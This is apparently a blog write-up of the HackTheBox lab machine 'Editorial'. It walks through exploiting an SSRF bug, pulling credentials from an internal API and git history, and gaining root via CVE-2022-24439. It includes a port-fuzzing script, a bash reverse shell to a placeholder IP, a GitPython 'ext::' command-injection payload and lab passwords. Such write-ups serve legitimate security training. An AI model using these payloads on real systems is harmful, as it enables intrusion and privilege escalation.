---

layout: post
title: "Practice Writeup: Exploiting SSRF and Privilege Escalation in Editorial"
author: "0x5t"
catalog: true
header-img: "img/post-bg-digital-native.jpg"
header-mask: 0.4
tags:

- Web Exploitation
- SSRF
- Privilege Escalation
- Git Enumeration
- HackTheBox

---

# Editorial Writeup

## Overview

**Machine Name:** Editorial\
**Date:** 10th Oct 2024\
**Difficulty:** Easy\

## Synopsis

The **Editorial** machine is an **easy** Linux-based challenge featuring a publishing web application vulnerable to **Server-Side Request Forgery (SSRF)**. The vulnerability is exploited to access an internal API, which reveals credentials leading to **SSH access**. Further enumeration discloses a **Git repository** containing credentials for another user. Root access is achieved via **CVE-2022-24439** and **sudo misconfigurations**.

## Skills Required

- Linux Command Line
- Web Enumeration
- Basic Scripting

## Skills Learned

- Server-Side Request Forgery (SSRF)
- Git Enumeration
- Basic Scripting

---

## Enumeration

### Nmap Scan

Scanning the target reveals **two open ports**:

- **Port 22** - SSH (OpenSSH 8.9p1 Ubuntu)
- **Port 80** - Nginx Web Server

#### Nmap Command:

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.10.11.20
```

Adding the domain to `/etc/hosts`:

```bash
echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
```

### HTTP Enumeration

Visiting **[http://editorial.htb](http://editorial.htb)**, we find a **publishing service website** with a "Publish with us" page that includes a **cover URL** field.

#### SSRF Exploitation

Testing for SSRF by inputting a **local IP address** and starting a Netcat listener:

```bash
nc -lnvp 5555
```

A successful **200 OK** response and Netcat callback confirm **SSRF vulnerability**.

---

## Foothold

### Internal Service Discovery

Using **Burp Suite Intruder** with a **common HTTP ports wordlist**, we identify an **internal API running on port 5000**. We then use a **Python script** to fuzz all **65535 ports**:

```python
import requests
for port in range(1, 65535):
    data_post = {"bookurl": f"http://127.0.0.1:{port}"}
    try:
        r = requests.post("http://editorial.htb/upload-cover", data=data_post)
        if not r.text.strip().endswith('.jpeg'):
            print(f"{port} --- {r.text}")
    except:
        pass
```

**Findings:** Port **5000** does not return `.jpeg` responses, indicating an API endpoint.

### Extracting Credentials

By querying the API at `/api/latest/metadata/messages/authors`, we retrieve **login credentials** for `dev`:

```json
{
  "Username": "dev",
  "Password": "dev080217_devAPI!@"
}
```

### SSH Access

```bash
ssh dev@10.10.11.20
```

User flag retrieved.

---

## Lateral Movement

### Git Repository Enumeration

In the `dev` home directory, we find a `.git` folder. Checking commit history:

```bash
git log
git show <commit-id>
```

We extract new credentials for user `prod`:

```json
{
  "Username": "prod",
  "Password": "080217_Producti0n_2023!@"
}
```

Switching users:

```bash
su prod
```

### Sudo Privileges Check

```bash
sudo -l
```

The `prod` user has **root execution rights** for:

```bash
/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

---

## Privilege Escalation

### Exploiting CVE-2022-24439

This script imports the `Repo` class from **GitPython**, making it vulnerable to **CVE-2022-24439**.

#### Crafting the Exploit

Creating a **reverse shell payload**:

```bash
echo "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1" > /tmp/shell.sh
chmod +x /tmp/shell.sh
```

Starting a **Netcat listener**:

```bash
nc -lnvp 4444
```

Executing the **privileged Python script**:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

This grants a **root shell**.

### Root Flag

```bash
cat /root/root.txt
```

**Root access achieved. Machine pwned!** 🎉

---

## Summary

1. **SSRF** was used to enumerate internal services.
2. **API exploitation** revealed `dev` user credentials.
3. **Git enumeration** disclosed `prod` user credentials.
4. **CVE-2022-24439** was leveraged for **privilege escalation**.
5. **Root access** was gained via **sudo misconfiguration**.

**Lessons Learned:**

- Importance of **restricting internal APIs**.
- **SSRF vulnerabilities** can expose sensitive data.
- **Git repositories** should not store credentials.
- **Improper sudo configurations** can lead to privilege escalation.

---

## Additional Resources

- [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)
- [Git Security Best Practices](https://git-scm.com/docs/git-security)
- [Burp Suite Intruder Guide](https://portswigger.net/burp/documentation/desktop/tools/intruder)

### End of Writeup ✅

